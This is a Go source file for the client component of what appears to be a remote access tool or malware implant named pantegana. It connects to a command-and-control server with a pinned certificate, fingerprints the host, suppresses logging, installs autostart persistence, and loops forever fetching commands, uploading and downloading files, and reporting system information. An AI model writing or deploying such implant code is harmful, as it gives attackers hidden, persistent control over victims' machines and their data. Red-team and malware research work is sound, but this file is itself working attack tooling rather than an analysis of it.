package client

import (
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"errors"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"time"

	"github.com/cassanof/pantegana/client/fingerprinter"
	"github.com/emersion/go-autostart"
)

type Client struct {
	Cfg         *ClientConfig
	HTTP        *http.Client
	Persistence *autostart.App
	BaseURL     string // Gets defined in RequestCommand() - requests.go
	Token       string
}

type ClientConfig struct {
	Name        string // Used for persistence
	DisplayName string // Used for persistence
	Host        string
	Port        int
	HasTLS      bool // for debug only
	HasLogs     bool // disable this in "production"
	AutoPersist bool // persistence on program execution
}

// routes
const (
	getCmdURL       = "/getcmd"
	cmdOutputURL    = "/cmdoutput"
	uploadFileURL   = "/upload"
	downloadFileURL = "/download"
	sysInfoURL      = "/sysinfo"
)

// special errors
var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")

// load the cert of the server
//go:generate rm -fr cert
//go:generate mkdir cert
//go:generate cp ../cert/server.crt ./cert/

//go:embed cert/server.crt
var certData []byte

func (cfg *ClientConfig) ClientSetup() *Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		TLSHandshakeTimeout: 10 * time.Second,
		Dial: (&net.Dialer{
			Timeout: 10 * time.Second,
		}).Dial,
	}
	httpClient := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Minute, // The client tries to reconnect anyways...
	}

	ok := tlsConfig.RootCAs.AppendCertsFromPEM(certData)
	if !ok {
		panic("Couldn't load cert file")
	}

	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
	token := strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)

	return &Client{
		Cfg:   cfg,
		HTTP:  httpClient,
		Token: token,
	}
}

func RunClient(cfg *ClientConfig) {

	if !cfg.HasLogs {
		log.SetFlags(0)
		log.SetOutput(ioutil.Discard)
	}

	fingerprinter.Run()

	client := cfg.ClientSetup()

	err := client.SetupPersistence()
	if cfg.AutoPersist && err == nil {
		go client.Persist()
	}

	for {
		cmd := client.RequestCommand()
		client.Middleware(cmd)
	}
}
